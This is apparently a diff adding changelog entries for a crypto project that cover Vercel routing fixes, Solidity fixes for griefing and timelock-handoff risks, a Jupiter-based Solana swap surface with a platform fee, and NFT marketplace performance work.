+- `1ad93479` — [`frontend/vercel.json`](frontend/vercel.json)'s SPA fallback `/(.*) -> /index.html` **shadowed serverless functions for GET and HEAD**: Vercel serves the static index.html fallback before the dynamic function resolves, while POST and OPTIONS correctly fell through to the function. That silently broke every GET aggregator provider (kyber, lifi, openocean, paraswap, swapapi) and, critically, the Jupiter Solana quote — `GET /api/jupiter/swap/v1/quote` returned index.html, which surfaced to the user as "No route". Fixed with a negative lookahead, `/((?!api/).*)`, so `/api/*` never gets the SPA fallback. That change stands unmodified.
+- `4bebad53` — with the fallback out of the way, two more production-only bugs surfaced. Both were pre-existing and both had been masked because **the aggregator had never been critically exercised on prod** (EVM swaps run on the native pool); the now-live Jupiter quote is what exposed them. First, the doubly-nested dynamic function `[provider]/[...path]` compiles on Vercel to match the provider plus **exactly one** path segment, not a true catch-all, so every real multi-segment endpoint — `swap/v1/quote`, `sor/quote/v2` — returned Vercel's platform 404 without ever reaching the handler; flattened to a single `[...slug]` where `slug = [provider, ...path]`. Second, **same-origin browser GET/HEAD requests carry no `Origin` header** — browsers send it cross-origin and for non-GET — so the fail-closed empty-Origin gate 403'd every legitimate same-origin quote fetch in production, while dev is permissive, which is exactly why local smoke tests never saw it. A missing Origin is now allowed for safe methods only; POST still requires an allowlisted Origin, which browsers always send, so cross-origin POST abuse stays blocked. api suite green at 319/319. The Origin half of this commit is the half that survived.
+- `7dcf60c4` — **and `[...slug]` still did not route reliably.** Neither nested form routed dependably under this project's `vercel.json` rewrites, whereas the flat functions (`solrpc`, `alchemy`, `v1`) route 100% reliably here — so the catch-all became a flat `api/aggregator.js`, and the rewrites now pass `?provider=<provider>&p=:path*`, with the handler slash-joining `p` back into a path. Net-zero function count, so no impact on the Hobby function cap. The unit tests were unchanged, since they pass provider plus path array, and the aggregator suite stayed 75/75.
+
+### Fixed — two gated contracts could be permanently bricked by counters that only ever went up (2026-07-09)
+
+Both surfaced by an econ-pass audit, both Medium, and both the same defect shape: a cap meant to bound *concurrent* state was gated on an append-only array's length.
+
+- `b7a43929` — `TegridyNFTLending`'s protocol-wide `MAX_TOTAL_OFFERS` (10,000) gated on `offers.length`, but `offers` is never popped on cancel or accept. **So the cap was a lifetime-creation ceiling, not a concurrent-open one:** once 10,000 offers had ever been created — griefable at gas-only cost through a create→cancel loop, since cancel fully refunds, or simply reached organically under normal load — `createOffer` reverted `TooManyOffers` permanently for every lender, with no on-chain recovery. The primary lending entrypoint bricked; existing loans stay safe, with no theft or lock. The fix mirrors the already-correct per-lender `openOffersOfLender` pattern in the same contract: an `openOffersCount` incremented on create and decremented on the two active→inactive transitions (cancel and accept, both guarded by `!offer.active`), with the cap gated on it. Both entrypoints were verified to flip an offer inactive exactly once, so the counter cannot double-decrement or underflow. `TegridyNFTLending` is gated and not deployed, so there is no storage-layout collision. The regression test asserts `openOffersCount` decrements on cancel while the lifetime `offerCount()` keeps growing, and that a post-churn create still succeeds — the exact path that bricked pre-fix. This is the fix the 2026-07-12 audit's LOW finding then ported to `TegridyLending`.
+- `28afe0b7` — `TegridyTWAP`'s H-07 `acceptOwnership()` override flushes the **entire** `_pendingResetPairs` set in one atomic loop, but `proposeAdminResetPair` validated nothing beyond `pair != address(0)` and carried no size cap. **A malicious or compromised outgoing owner — the exact adversary the H-07 flush exists to defend against — could queue thousands of arbitrary addresses so the incoming owner's `acceptOwnership()` reverts out-of-gas forever**, permanently bricking the deployer→multisig ownership-rotation recovery path, which is a currently-pending operator task. Griefing and liveness only; no funds at risk. Fixed with no new storage — a constant and a require, so layout- and EIP-170-safe: `proposeAdminResetPair` now validates `factory.isPair(pair)`, giving it parity with its sibling `proposeAdminMinReserveFloor` and removing the cheap arbitrary-address flood vector, and `_pendingResetPairs` is capped at `MAX_PENDING_PAIR_RESETS = 64`, guarded by a `!contains` check so re-proposing an already-pending pair never wrongly trips the cap — hard-bounding the atomic flush far below the block gas limit. Execute and cancel free slots, so the cap never blocks a legitimate emergency reset. Regression tests cover both halves: a non-pair address is rejected with `UnknownPair`, and a real pair is accepted, tracked, and freed on cancel — the set tracks live pending resets, not a monotonic lifetime count.
+
+### Security — an outgoing owner could hand over a live timelock queue; three admin contracts never flushed it and a fourth flushed five kinds of six (2026-06-19)
+
+`f0f33d9b`. The timelock-handoff booby trap: an outgoing or compromised owner queues a hostile timelocked proposal immediately before `transferOwnership`. **Without an `acceptOwnership` override the timelock keeps running, and the incoming owner inherits an already-executable proposal — several of which have permissionless execute paths**, so the new owner does not even have to be the one who fires it. `PremiumAccess` and `TegridyStakingAdmin` already carried the override; this closes the class across the rest.
+
+- **`POLAccumulator`** — the earlier M19-PORT override flushed five proposal kinds and omitted the sixth. The `DAILY_ETH_CAP_CHANGE` flush block is added, mirroring `cancelDailyETHCap()`.
+- **`CommunityGrants`** — not a flush at all: it stamps `lastOwnershipChangeAt` on handoff and rejects a cancel-approved proposal queued at or before that timestamp in the permissionless `executeCancelApproved` path.
+- **`MemeBountyBoard` / `TegridyLPFarming` / `VoteIncentivesAdmin`** — the three carrying no override whatsoever. They now flush all in-flight timelock proposals on handoff, mirroring `PremiumAccess` / `TegridyStakingAdmin`.
+- **`TegridyDropV2`** — unrelated to the handoff class, carried in the same commit: `setMintPhase` into `DUTCH_AUCTION` now rejects an already-ended curve (`DutchAuctionAlreadyEnded` parity), with a regression test for the ALLOWLIST zero-price-post-mint H19 variant added to [`contracts/test/TegridyDropV2.t.sol`](contracts/test/TegridyDropV2.t.sol).
+
+191 lines added across six contracts and one test file. The commit records that every change references only existing symbols and that `forge fmt` parses clean, and rules out storage collision on the grounds that all of these contracts are gated and **not yet deployed** — so nothing here is a fix to live bytecode.
+
+### Fixed — the Shield acknowledgement gate matched severities Jupiter never emits, and the Limit tab skipped it entirely (2026-06-18)
+
+`fa53b732`. A 27-agent adversarial review of Batches 1–4A: 22 raw findings, **8 verified real, 14 dropped as false positives**. The commit records nothing funds-at-risk — everything found was trust/safety parity or UX correctness the build cannot catch, and most of it sat in the limit-order path that cannot be exercised without a funded wallet.
+
+Medium:
+
+- **The Limit tab bypassed both the Shield warnings and the unverified-token acknowledgement**, so a user could place a real on-chain order against a flagged or unverified token with no warning at all. `LimitTab` now receives `shieldWarnings` / `needsAck` / `ack`, renders the warnings and the checkbox, and folds `(needsAck && !ack)` into `canPlace`.
+- **The acknowledgement gate shipped hours earlier was dead code.** It matched severities `critical` / `high` / `danger`, and Jupiter Shield only ever emits `info` and `warning` — which corrects Batch 2's own account of that gate (`43b29a67`, below), where it is recorded as firing on an unverified token or a critical-severity Shield flag. It is replaced by `dangerousShield()`, which gates at `warning` and above but treats a curated stablecoin's or LST's expected freeze authority (USDC/USDT/LST) as benign, so honeypot, transfer-hook and fee warnings gate while USDC does not nag. The misleading severity comment in `jupiter.ts` was fixed with it.
+
+Low:
+
+- `takingAmount` moved to BigInt fixed-point. The float-then-`toFixed` version went exponential at ≥1e21 and underflowed below one unit, and **both failure modes silently nulled the value**. That collapses three of the findings into one fix, with clearer "Amount too small" / "Amount too large" labels.
+- The limit path had no balance gate at all; `useTokenBalance` plus an insufficient-funds guard added.
+- Open-order rows showed only a truncated key — a mis-cancel hazard — and now read "Sell X TOK → Y TOK" with the key as the subtitle.
+- `fmtUsd` rendered any sub-cent value as "~$0.01", rounding up and mislabelling it at once; now "<$0.01".
+
+Verified `tsc`/eslint/vite build clean, 86 tests, and live: USDC warnings show without nagging, the Limit tab renders the Shield warnings, zero console errors. Still dark.
+
+### Added — trending rails, Shield warnings, LST staking and real on-chain limit orders on the Solana surface (2026-06-18)
+
+Four batches, all still gated dark, all reading through the existing `/api/jupiter` proxy — with Batch 2's pre-sign simulation going through `/api/solrpc` — and **all four together add zero net-new Vercel functions**. The Hobby plan's 12-function cap is the binding constraint, and the surface sat at 10/12 after the RPC proxy.
+
+- **Batch 1 — volume and conversion polish** (`a2825edb`). A "Trending on Solana" rail with Trending / Top Traded / Top Organic toggles, 24h change and one-click buy (pay SOL → token, which is the fee-bearing direction), from `tokens/v2/{toptrending,toptraded,toporganicscore}/{interval}`. USD values on both legs from one `price/v3` call per pair, and route transparency ("via Raydium / Orca / …") off the quote's `routePlan` labels. Token icons go through the weserv image proxy (`wsrv.nl`, allowlisted in `img-src`) with an initials-avatar fallback on a missing or broken image, so **we never load from — or leak a user's token interest to — arbitrary token-image hosts**. That reverses the deliberate no-remote-icons decision recorded in `959325ee` below; the proxy is what made it privacy-safe. A provider-level `cacheControl` was deliberately *not* added, because it would also cache per-user quote responses. Live: real trending and price data through the proxy, ~$69 pay / ~$68 receive, "via ZeroFi", 12 trending tokens with % changes and verified badges.
+- **Batch 2 — trust and safety** (`43b29a67`). Per-pair Jupiter Shield risk warnings — honeypot, freeze authority, mint authority, transfer fee, low liquidity — from `ultra/v1/shield`, fetched once per pair and **failing open**, rendered by *severity* rather than by `type` because the codes evolve: warning and critical in red, info in grey. The commit records the acknowledgement checkbox as forced only on an unverified token or a critical-severity Shield flag — which turned out to be dead code, and is corrected in the review entry above. Plus pre-sign simulation: `simulateTransaction` through `/api/solrpc` between build and send (`replaceRecentBlockhash`, `sigVerify` off), refusing to send a swap that would revert on a honeypot, freeze, slippage or insufficient balance, and saving the gas. Also fail-open. `solrpc` forwards `simulateTransaction` verbatim, so the proxy needed no change.
+- **Batch 3 — LST "Earn"** (`e6870f3c`). "Stake SOL" is just a buy of a liquid-staking token through the unchanged swap: JitoSOL, mSOL, bSOL and INF, all four mints byte-verified against the Jupiter token API (legacy SPL, 9 decimals, verified). APY labels are static and operator-refreshed — no live-APY fetch, so no new function and no CSP change. **Native stake-pool deposits were deliberately not integrated**: marginally better rate for the user, much more surface, and no fee to us, so the Jupiter buy is the better trade on our side. Copy says plainly that value grows each epoch, there is no lockup, sell anytime, APY is variable, and the buy carries the 1% fee on the wSOL leg.
+- **Batch 4A — limit orders** (`4ba32216`). Jupiter Trigger orders: sell amount, target price and expiry (1d/7d/30d/never) become a **real on-chain order filled automatically by Jupiter's keepers**, with funds reserved until fill, cancel or expiry, and an open-orders panel with per-order Cancel. That is an honest upgrade over the EVM alerts described further down this file, which are browser-watched and need a tab left open. `jupiter.ts` gains `createTriggerOrder` / `getTriggerOrders` / `cancelTriggerOrder` and a defensive `orderKeyOf`; create and cancel return a base64 transaction signed, sent and confirmed through the same wallet-adapter flow as swaps. **It ships fee-off**: Trigger integrator fees require a Jupiter referral-account setup, which is an operator-gated follow-up, and it deliberately does not reuse the plain-swap fee ATA, which would either collect nothing or be rejected outright. DCA was skipped on the founder's call, because Jupiter's Recurring API exposes no integrator fee at all.
+
+The proxy's `matchPath` was widened once per batch — trending and `price/v3` plus `limit`/`ids` query params, then `ultra/v1/shield` plus `mints`, then `trigger/v1/{createOrder,execute,cancelOrder,cancelOrders,getTriggerOrders}` plus `user`/`orderStatus`/`page` — and the aggregator-proxy suite took +3, +1 and +2 across Batches 1, 2 and 4A to reach 75. The Shield response shape was confirmed by curl before the UI was wired to it, and so were the Trigger endpoints (`getTriggerOrders` returning `{orders:[]}`, `createOrder` returning a transaction); Batch 1's trending and price endpoints were checked by rendering real data through the proxy. The create/cancel sign flow and the open-orders panel still need a funded wallet to be fully exercised.
+
+### Security — the Solana RPC endpoint lived in the public bundle; the client now talks only to our own origin (2026-06-18)
+
+Two commits earlier the rule had only been *written down*: `VITE_SOLANA_RPC_URL` is inlined into the public bundle, so a keyed Helius/QuickNode/Triton URL would have shipped its key to every visitor, and the interim fix was to forbid keyed URLs and warn in dev. **That variable is now gone from the client entirely**, which closes the H-35-class key leak rather than documenting around it.
+
+- **[`frontend/api/solrpc.js`](frontend/api/solrpc.js)** — a hardened same-origin JSON-RPC forwarder: POST-only, an origin allowlist that fails closed on production and preview, a per-IP rate limit, a 64 KB request cap (`MAX_REQUEST_BODY_SIZE = 64 * 1024`) and a bounded response cap. Modelled on `api/etherscan.js` and the aggregator proxy. It forwards to a server-only `SOLANA_RPC_URL` — where a **keyed** URL is now safe precisely because it never reaches the browser — or to the keyless default.
+- `SolanaProviders` points the `Connection` at `/api/solrpc`, so balance reads, `sendTransaction` and confirmation all proxy through it. `VITE_SOLANA_RPC_URL` was removed and the CSP dropped its last Solana host, leaving **`'self'` as the only RPC destination the browser is allowed**. `.env.example` moves the setting into the server-only section, and the vite dev server proxies it too.
+- Swap UX caught up in the same commit: wallet balance for the pay token (SOL via `getBalance`, SPL via parsed token accounts), a MAX button that reserves ~0.01 SOL for fees, and an insufficient-balance guard that disables Buy and relabels the button. `f91855b7` added the missing **"Minimum received"** line, taken from the quote's `otherAmountThreshold` — the slippage-protected guaranteed output, and a standard element the card had been shipping without.
+
+Verified with 85 tests (5 of them new for `solrpc`), a live `curl /api/solrpc getLatestBlockhash` returning a real result end to end, and a 0.5 SOL → 34.06 USDC quote rendering with the fee line "in USDC" and no console errors. Serverless functions stood at 10 of the Hobby cap's 12. `f91855b7` also gave [`docs/SOLANA_FEE_CAPTURE_PLAN.md`](docs/SOLANA_FEE_CAPTURE_PLAN.md) a "SHIPPED — final architecture" section and an operator activation runbook, superseding the stale curated-allowlist and input-mint-fee design notes the document still carried below them.
+
+### Changed — any-pair swaps, after the input-mint fee model turned out to revert every arbitrary pair (2026-06-18)
+
+`bdd486c1`. The curated five-token restriction is dropped: users can swap **any** pair, searching by symbol or name or pasting a mint, the way Jupiter's own UI works.
+
+> **Correction.** `4f1516e9`, landed an hour earlier the same day, recorded the fee-from-input-mint design as "confirmed correct". **Once an arbitrary mint can be the input leg, the unconditional input-mint fee derivation would have reverted the swap**, because the fee account for that mint does not pre-exist. The load-bearing Jupiter fee behaviour was researched against developers.jup.ag and adversarially verified before the restriction came off.
+
+- `jupiter.ts` replaces the derivation with a single pair-aware `pickFeeMint(input, output)`: the fee mint is whichever leg falls in our pre-created {wSOL, USDC} set — ExactIn permits either — preferring USDC, with `null` meaning no fee. **The same decision drives both `/quote`'s `platformFeeBps` and `/swap`'s `feeAccount`**, so the two can never drift apart and the fee account always pre-exists; an arbitrary pair cannot break the swap, it simply runs fee-free. Unit-tested across all six directions.
+- `solanaTokenList.ts` gains `searchTokens()` / `resolveMint()` against Jupiter `/tokens/v2/search` with a session cache, and `SolToken` gains `verified` / `tokenProgram` / `audit`. **Decimals are authoritative from that endpoint and never hardcoded** for an arbitrary token.
+- The picker shows verified ✓ / Unverified / Token-2022 / freeze badges, an accurate per-pair fee line ("… in SOL/USDC", or "None on this pair"), and an unverified-token "I understand, swap anyway" gate that warns rather than blocks.
+- The aggregator proxy's existing `jupiter` provider was extended to allow `tokens/v2/search` and the `query` param — again zero net-new Vercel functions.
+
+Live-tested in the browser: searching "wif" returned real results with correct verified / unverified / Token-2022 badges, and selecting an unverified token produced the fee line "1.00% · in SOL" with the warning banner and acknowledgement checkbox, zero console errors. 80 tests (jupiter 11, aggregator 69).
+
+### Fixed — a swap could be signed against a stale quote, and Buy briefly armed against the token you had just left (2026-06-18)
+
+A 25-agent adversarial review of the new Solana swap code: 20 raw findings, **9 verified real, 11 dropped as false positives**.
+
+- **`handleSwap()` now re-quotes immediately before building the transaction**, so the on-chain minimum-out and the routing match the live market instead of whatever the card happened to be displaying.
+- The debounced quote's `then`/`catch` are guarded on `ctrl.signal.aborted` and the unconditional `.finally` is gone. Before that, **a ~400 ms window after a token switch had an aborted run flip `quoteLoading` back to false — showing a stale quote and briefly enabling Buy against the OLD output token.**
+- `priceImpact` gets a `Number.isFinite` guard and `Math.abs`, with the row gated on render: no more "NaN%" from a malformed quote, and favourable or negative impact is no longer hidden behind "<0.01".
+- `TokenPicker` asserted `aria-modal` without implementing it. It now focuses into the dialog on open, traps Tab, and restores focus to the trigger on close.
+- Neutral copy on a confirmation timeout, and an inline "Enter a valid amount" hint for the non-decimal input (`-5`, `1e3`) that `toBaseUnits` rejects.
+- Secret handling, per the repo's H-35 rule: `solana.ts` and `.env.example` forbid a keyed RPC URL in `VITE_SOLANA_RPC_URL` because it is inlined into the public bundle, with a dev-only warning if a keyed URL is detected, and `vercel.json` drops `*.helius-rpc.com` / `*.quiknode.pro` from CSP `connect-src` so the policy stops advertising keyed hosts while keeping keyless `*.solana.com` (+wss). **Superseded the same day** by the same-origin proxy above, which removed the client-side variable outright.
+
+Verified `tsc -b`, vite build and eslint clean, `vercel.json` valid.
+
+### Added — a Solana swap surface that takes a platform fee, shipped dark (2026-06-18)
+
+The first, no-capital piece of the Solana fee-capture plan: users buy Solana tokens on Tegridy through the Jupiter Swap API and we skim a platform fee on the way through. **No own on-chain program, no bridge, and TOWELI never touches Solana.**
+
+- **The proxy** (`fef605e7`). `api/aggregator` gains a hardened `jupiter` provider (`lite-api.jup.ag`) routing `GET /swap/v1/quote` and `POST /swap/v1/swap` through the existing consolidated catchall, inheriting its origin allowlist, per-IP rate limit, 32 KB body cap and header stripping — and **adding no new Vercel function**, which is what keeps the Hobby 12-function cap safe. `vercel.json` rewrites `/api/jupiter/:path*` onto it.
+- **The gate.** `src/lib/solana.ts` holds `SOLANA_FEE_ACCOUNT` (`VITE_SOLANA_FEE_ACCOUNT`), the platform-fee bps and `isSolanaConfigured()`. It is a separate app-only module rather than an addition to `constants.ts`, because `constants.ts` compiles under the node tsconfig via `wagmi.config.ts`, where `import.meta.env` is untyped. The surface stays off while `isSolanaConfigured()` is false and **auto-un-gates the moment the operator sets a multisig-owned fee account in Vercel env**.
+- **The UI** (`da09d560`). `src/pages/SolanaSwapPage.tsx` is the swap card: pay/buy pickers, debounced live quote, slippage presets, transparent fee disclosure, and connect/swap with status-polling confirmation and a solscan link, falling back to `FeatureNotDeployed` when no fee account is set. `src/components/solana/` carries the wallet-adapter providers (Wallet-Standard auto-detect) and a styled connect button, mounted only inside the lazy page. `src/lib/solanaPolyfill.ts` scopes the Buffer/global polyfill to the Solana chunk — imported first, so vite needs no global polyfill for the EVM libraries that do not want one.
+- **Cost to everyone else: nothing.** `@solana/web3.js`, the wallet adapters, `spl-token` and `buffer` load only with the lazy `/solana` route, as the `vendor-solana` manual chunk at **~98 KB gzipped, with the main bundle untouched**.
+- **Local parity** (`92fbf62a`, eight lines). The production rewrite chain (`vercel.json` → `api/aggregator/jupiter` → `lite-api.jup.ag`) had no equivalent in the vite dev server, so quotes only worked in a deployed preview. Mirroring it in `vite.config.ts` fixed that, verified with a 0.5 SOL → 35.06 USDC quote rendering on `/solana` in `npm run dev` with no console errors.
+
+The token list shipped as a curated SPL allowlist — SOL/USDC/USDT/JUP/BONK plus an operator slot — with no arbitrary-mint listing, for scam safety; that restriction came off the same day (see above). 69/69 aggregator tests, `tsc -b`, vite build and eslint clean, navConfig 7/7. The plan document is [`docs/SOLANA_FEE_CAPTURE_PLAN.md`](docs/SOLANA_FEE_CAPTURE_PLAN.md). The UI commit records its runtime browser smoke test as still **pending** at that point, with no browser connected and the feature dark in production.
+
+### Added — Three revenue rails for the NFT marketplace, two of them inert until an operator acts (2026-06-16)
+
+The marketplace already charged a flat 1% on native order-book fills. Three commits turned
+that single line into a set of rails, and two of the three cannot earn anything until
+someone deploys a contract.
+
+- **A price tie between a native listing and an OpenSea listing used to go to OpenSea,
+  earning the protocol nothing.** `mergeListings` deduped cheapest-wins with a strict `<`
+  and processed OpenSea first, so an exact match lost. Native is now inserted first and
+  wins ties; a strictly-cheaper OpenSea listing still wins, so the buyer never pays more.
+  The 1% is carved from the *seller's* proceeds in `orderbook.js createNativeListing`, not
+  added to the buyer — so the tie-break captures the platform fee at zero cost to the
+  buyer. The commit notes Phase 0 was already complete: the broken Seaport `cancel()` ABI
+  had been fixed (`lib/seaportCancel.js`) and the FULL_RESTRICTED/zero-zone `validateOrder`
+  revert on 2026-06-10 (`orderType=0`).
+- **`TegridyNativeBuyRouter` — a draft, and explicitly not deploy-ready.** A thin Seaport
+  fulfilment wrapper: the buyer fulfils a native listing *through* the router, the NFT is
+  hard-routed to `msg.sender` (the router never custodies it), the exact ETH is forwarded,
+  and the 1% the listing already pays is handed to `ReferralSplitter.recordFee(buyer)` so a
+  referrer earns a cut at no extra cost to the buyer. Non-native orders pay the router
+  nothing, so `fee = 0` and the call is pure pass-through. It reuses the repo's existing
+  bases — OZ `ReentrancyGuard`, `OwnableNoRenounce`, `WETHFallbackLib` — guards against
+  overpay mis-attribution with an exact-value check, holds no ETH between calls, and wraps
+  `recordFee` in `try/catch` so a splitter misconfiguration can never brick buys.
+  **The commit could not compile it locally — `forge build` hangs in this checkout — and
+  says so; it was pushed so CI would compile it.** It is gated on CI compile, a
+  mainnet-fork suite (buy one native and one OpenSea listing through it; assert NFT
+  delivery and referral credit) and a full external audit before any deploy. Attacker pass,
+  integration and wiring steps are in `docs/NATIVE_BUY_ROUTER_DESIGN.md`.
+- **A Tegridy Pro Pass funnel that auto-activates the moment an operator deploys the
+  collection and sets its address.** `useProAccess` reads `balanceOf` behind a
+  `PRO_PASS_LIVE` flag, mirroring the existing `isDeployed` gating pattern; a new `/pro`
+  page lists the perks and shows a mint CTA that reads "MINTING SOON" until
+  `TEGRIDY_PRO_PASS_ADDRESS` is set. Perks are additive only — Pro flair, a referral-fee
+  cut, early tool access, a tradeable membership NFT — and the commit states that Pro never
+  paywalls a currently-free feature. Verified in its pre-deploy state: page renders, status
+  pill reads MINTING SOON, CTA disabled, no console errors. Activation is an operator task:
+  deploy a DropV2 Pro Pass through LaunchpadV2 with an ETH mint price, re-audit per
+  feature, then set the address.
+
+A follow-up cleared two Slither notes on the router with no behaviour change — the unused
+`_NO_RESOLVERS` storage array was dropped for an inline `new CriteriaResolver[](0)`
+(removing both the "never initialized" finding and an unused storage slot), and the
+`sweepToTreasury` zero-balance sentinel was annotated `slither-disable incorrect-equality`
+per repo convention. The third note, that the router should inherit `IReferralSplitter`,
+was left alone: the minimal local interface is deliberate and the deployed splitter is
+untouched.
+
+### Internal — A holistic re-read of the day's own work, and 151 lines of dead trade code deleted (2026-06-16)
+
+After seven commits landed across 06-14 to 06-16, a consolidation pass re-read the range
+`798d107..HEAD` and reported the money path clean. What it did surface were four
+low-severity defects, all in `Listings` and all introduced by the new sorting and batching:
+
+- the best-value comparator computed `Infinity − Infinity = NaN` for two rank-null tokens,
+  leaving their relative order undefined. It now compares scores and breaks ties by token
+  id — deterministic and stable as ranks stream in.
+- window-enriched extras from `fetchTokensByIds` carry `rank: null`, and the `allTokens`
+  merge let them overwrite already-ranked gallery tokens, so a token that was enriched and
+  *then* loaded kept a null rank and sank in both rank-sensitive sorts. The merge now
+  preserves an existing non-null rank.
+- the batch bar read `selectedIds.size` for "X selected" while the ETH total and Add-All
+  both iterated `displayNfts`, so the three numbers could disagree once a trait or price
+  filter hid part of the selection. It now counts visible-and-priced selections, so all
+  three agree.
+- an inert `cart={cart}` prop on the `<Listings>` render was dropped — unused, and
+  pre-existing.
+
+Separately, the entire Trade Offers block in `userdata.js` was removed:
+`createTradeOffer`, `getIncomingTrades`, `getOutgoingTrades`, `updateTradeStatus` and the
+`tradesCacheKey`/`loadTradesCache`/`saveTradesCache` helpers — **151 lines of anon-client
+writes to a table that migration 007 had already made service-role-only.** It went dead
+when NftCompare was rewired to the audited `lib/trades` SDK the previous day;
+`getOutgoingTrades` had no caller at all. A grep over `frontend/src` confirmed zero
+remaining importers, and the same-named `createTradeOffer`/`updateTradeStatus` in
+`lib/trades.js` are different, audited functions.
+
+### Fixed — The Compare tab signed a real Seaport trade, failed to store it, and said it was sent (2026-06-15)
+
+Item #10 of a top-10 review, and the only item in its batch flagged a bug. Sending a trade
+from the Compare tab signed a genuine Seaport order and then persisted it through
+`lib/userdata.createTradeOffer`, whose anon-client insert into `trade_offers` is rejected
+by RLS — migration 007 made that table service-role-only. **The `catch` fell back to
+`localStorage` and the UI still toasted "Trade offer sent".** The hand-rolled order was
+also built as orderType-2 against the OpenSea zone, which the app's own audited
+`acceptTrade` path cannot fulfil — so even a stored order was not fillable in-app.
+
+`handleSendTrade` now calls the audited `lib/trades.createTradeOffer`: a service-role
+`/api/orderbook` write, a canonical order, and a typed result, so a failed persist surfaces
+honestly instead of being swallowed. Incoming and sent trades hand off to the audited
+Trades tab. About 190 lines of hand-rolled Seaport and the now-orphaned
+`incomingCardStyle` went with it.
+
+Two disclosure changes rode along, both from the same review: a footer trust strip
+(non-custodial / settles via Seaport / flat 1% fee, linking to Etherscan) placed where a
+logged-out visitor decides whether to connect, and a route-and-fee chip in the buy modal's
+price box — native order-book listings read "incl. 1% fee", OpenSea listings read "OpenSea
+listing", both "+ network gas". **The single-buy path had never disclosed what the price
+included.**
+
+### Added — The buy grid learned the trait filter, the order book learned phones, and the trade board learned who could fill a post (2026-06-15)
+
+- **The buy grid ignored the global trait filter.** `FilterSidebar` lived only in Gallery,
+  so a buyer who wanted the cheapest listed Gold-Background token had to cross-reference by
+  hand — and the `activeFilters` state already persisted across tabs in `useNfts`; `App`
+  simply was not passing it down. `Listings` now receives
+  `activeFilters`/`onFilter`/`loadAll`/`hasMore` and intersects listed tokens with the same
+  trait predicate `useNfts` uses, pulls the full token set in through `loadAll` when a
+  filter or the value sort is active (so every listed token has attributes and ranks, not
+  just the loaded gallery page), renders the shared `FilterPills` so the active filter is
+  visible and removable, and gained a "Best Value (rarity ÷ price)" sort — rank × price
+  ascending, with unranked and zero-price tokens last. Checked live through the Chrome
+  extension: setting Type = Human Latte in Gallery filtered the buy grid from 60 to 12
+  listed matches with a removable pill.
+- **On phones the native order book was a 6-column table with `overflowX: auto`.** Every
+  style was inline, so no media query reached it — the commit calls it the least native
+  pattern in the app. The rows were extracted into a pure `NativeListingsList` that renders
+  the table on wide viewports and stacked cards below 640px (token + price row, maker/date/
+  status meta, a full-width Buy or Cancel), gated by an `isNarrow` `matchMedia` state in
+  `OrderBookPanel` and mirroring the DirectMessages pattern.
+- **The trade board was a passive chronological wall**, ordered by `created_at DESC` only,
+  so a wallet holding exactly what an open `any <collection>` post wanted was never told —
+  the commit names this as the core reason the P2P surface advertised its own emptiness.
+  The board now loads the connected wallet's holding count per collection once (three
+  collections, one `fetchWalletNfts` each, ref-guarded per wallet, no poll), floats fillable
+  posts to the top while preserving `created_at` order within each group, badges them
+  ("✓ You can fill this — you hold N"), and shows a header count. Fillable means holding at
+  least one token per requested wildcard slot of every requested collection.
+
+**Both new surfaces are `/api/orderbook`-backed and therefore cannot be exercised on the
+vite dev server at all**, so the commits made unit tests the source of truth rather than a
+supplement: three `createRoot` render cases for `NativeListingsList` (table at wide, cards
+at narrow, Cancel + You for the owner's own listing) and eight cases for the pure
+`lib/trades.fillableHoldings` covering own-post, inactive, multi-slot, multi-collection,
+specific-token and no-wallet edges.
+
+### Changed — The listings grid stopped blocking first paint on five serial pages, and stopped re-rendering itself whole (2026-06-14 → 2026-06-15)
+
+A live dive through the Chrome extension found the Tradermigos listings grid blocking
+first paint on all ~5 serial OpenSea cursor pages — roughly 1.5–3s of nothing on screen.
+Seven commits took the buy and browse paths apart.
+
+- `fetchListings` now paints on OpenSea **page 1** — the 200 cheapest, far more than the
+  60-card render chunk — and streams the remaining cursor pages into the TanStack query
+  cache through an `onProgress` callback wired in `useListings`. Floor, median and
+  listed-count converge a beat later instead of gating first paint.
+  `fetchOpenSeaListings` was split into a page fetcher and a pure normalizer, and
+  `mapNativeListings`/`mergeListings` were extracted; callers without `onProgress`
+  (CollectionHealth) still get the full set synchronously. Verified live: the grid painted
+  cheapest-first and LISTED converged to 793.
+- `.listing-card` gained `content-visibility: auto` with `contain-intrinsic-size: auto`, so
+  the cards the manual "show more" chunk keeps adding to an unbounded DOM skip layout and
+  paint while off-screen, with the auto intrinsic size keeping scroll stable across
+  breakpoints.
+- **The grid mapped its card subtree inline, so every per-card async tick — a best-offer
+  arriving, a checkbox toggle, a buying spinner — reconciled hundreds of card subtrees.** A
+  module-level `React.memo ListingCard` was extracted; every value it reads is a prop and
+  its handlers (`toggleSelect`, `onPick`, `handleBuy`) are already stable across exactly
+  the updates that triggered the cascade, so only the affected card re-renders. Paired with
+  `content-visibility`, the commit argues this is virtualized-grade behaviour without
+  restructuring the window-scrolled embedded grid, where `react-virtual` would be a
+  high-risk change for marginal gain.
+- The per-token best-offer fetch was a **strict serial loop over the first 20 listed
+  tokens** — up to 20 OpenSea round-trips summed, trickling in after paint and competing
+  for the proxy rate limit. It is now bounded-concurrency 6: same per-token data, wall time
+  near the slowest few rather than the sum, still under the per-IP cap.
+- The buy click's pre-wallet preamble fetched OpenSea `fulfillment_data` behind an extra
+  `eth_accounts` read and used the patient 1500ms-base background retry, so a logged-in
+  buyer could sit on a spinner before the wallet opened. `fulfillSeaportOrder` now takes
+  `opts.buyerAddress` and the primary buy surfaces pass their already-connected wallet,
+  skipping a `getAddress()` round-trip in front of the dominant POST; that POST uses a fast
+  retry (1 attempt, 400ms base) instead of the background backoff — safe because it is a
+  read, so an OpenSea 429 yields a quick retry or a fast "try again" rather than a
+  multi-second hang.
+- The buy-grid enrichment effect fetched Alchemy metadata for **every** listed token
+  (~1000 streamed) on first paint — up to ~10 sequential proxy batches competing for the
+  same rate limit that froze the grid into letter placeholders in production. It was
+  relocated below `displayNfts`/`visibleCount` and scoped to
+  `displayNfts.slice(0, visibleCount + one-chunk lookahead)` plus the few recent-sale
+  tokens, re-running as "Show more" widens the window; off-window cards render as
+  `imagePending` placeholders and enrich on reveal. Safe because cards render fine
+  un-enriched by design, sweep/sort/price maths read off the listing rather than the
+  enriched token, and the `uniqueMissing === 0` guard converges the
+  displayNfts → extraTokens → displayNfts cycle. Verified live: all 60 visible cards got a
+  real image src, no "Maximum update depth", stable proxy call count.
+- A shimmer-sweep placeholder replaced the ~60 static letter tiles for the pending state,
+  which the commit says read as "empty/broken". The permanently-missing state keeps the
+  static fallback so the shimmer never implies endless loading, and it respects
+  `prefers-reduced-motion`.
+
